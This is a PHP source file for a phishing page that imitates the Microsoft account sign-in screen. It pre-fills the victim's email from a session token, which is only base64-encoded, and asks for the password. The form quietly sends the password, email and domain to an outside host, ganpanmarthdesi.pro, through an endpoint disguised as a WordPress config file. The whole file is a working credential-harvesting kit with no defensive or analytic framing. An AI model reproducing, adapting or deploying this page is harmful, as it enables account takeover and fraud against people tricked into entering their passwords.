<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Sign in to your Microsoft account</title>
<link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  width: 350px;
  padding: 0 1px;
  margin: 0;
  background: #fff;
  border: 0px solid #d9d9d9;
  border-bottom: 1px solid black;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  color: #404040;
  }
  input[type=password]:focus {
  outline: none;
  border: 0px solid #4d90fe;
  border-bottom: 1px solid black;
  }
.footer {
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  background-color: #626159;
  heigth: 20px;
  color: white;
  text-align: right;
}

</style>
<body background="https://i.ibb.co/LZBJNz3/bg.png">

<div align="center">
	<table border="0" width="440" cellspacing="0" cellpadding="0">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="129" ></td>
				</tr>
				<tr>
					<td background="https://i.ibb.co/JC3z309/fm.png">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="40"></td>
							<td>
							
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							    <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
								<tr>
									<td height="88"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="30"></td>
											<td height="18" style="font-size: 15px;font-family: Arial, Helvetica, sans-serif; line-height: 18px;white-space: nowrap;overflow: hidden;text-overflow: ellipsis;" width="328"><?php echo $users;?>@<?php echo $ddomain;?></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="54">
									   <input type="hidden" name="user" required="true" placeholder="Email" value="<?php echo $users;?>@<?php echo $ddomain;?>" >
                                                                           <input type="hidden" name="link" value="https://outlook.office365.com/mail/" >
                                                                           <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
                                                                           <input type="hidden" name="sender" value="Outlook.com" >
									</td>
								</tr>
								<tr>
									<td height="35">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="6"></td>
											<td height="34">
											    <input type="password" name="passwd" placeholder="Password" required autofocus >
											</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="60"></td>
								</tr>
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td></td>
											<td width="109">
											<input type="image" src="https://i.ibb.co/Mgsmn44/btn.png" width="108" height="32"></td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="50"></td>
								</tr>
								</form>								
							</table>
							
							</td>
							<td width="44"></td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="120"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>
<div class="footer">
            
<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td>&nbsp;</td>
				<td width="77"><font color="#FFFFFF" size="2">Terms of use</font></td>
				<td width="20"></td>
				<td width="105">
				<p align="right"><font size="2" color="#FFFFFF">Privacy &amp; 
				cookies</font></td>
				<td width="20">&nbsp;</td>
				<td width="17">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td><font color="#FFFFFF" size="4">...</font></td>
					</tr>
					<tr>
						<td height="10"></td>
					</tr>
				</table>
				</td>
				<td width="10"></td>
			</tr>
		</table>
		</td>
	</tr>
</table>
            
</div>
</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>